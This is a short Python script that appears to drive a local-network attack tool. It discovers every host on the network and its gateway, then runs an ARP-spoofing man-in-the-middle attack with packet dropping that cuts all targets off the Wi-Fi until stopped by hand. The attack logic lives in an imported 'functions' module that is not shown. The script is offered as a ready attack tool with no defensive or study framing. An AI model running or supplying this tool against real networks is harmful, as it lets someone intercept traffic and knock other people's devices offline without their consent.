#!/usr/bin/env python
import functions

# First, we have to start the process of becoming the man in the middle without intrerupting the network connection, but we won't do that now, because we have to check some things before we start the attack

#Getting the info we need.
ans = functions.Find_network_ip_info()
if ans.gather_info() :
    netmask ,ip_adress, cidr= ans.gather_info()
else:
    exit()
if ans.get_gateway() :
    gateway = ans.get_gateway()
else :
    exit()

#Getting all ip_addresses.
ans = functions.Findall_ips_on_network(ip_adress, netmask ,cidr)
ip_addresses = ans.discover_ips()

#Getting the machine ready
ans = functions.Set_values()
ans.make_settings("down")



#Executing the arspoof attack, which allows you to become the man in the middle.
#Executing the packet drop attack, which results in disconnecting the targets from the Wi-Fi network.
#The attack is gonna run as long as you don't manually stop it.

ans = functions.Attack(ip_addresses,gateway)
ans.runnning_attack()

# Getting the system to it's initial settings.
ans = functions.Set_values()
ans.make_settings("up")
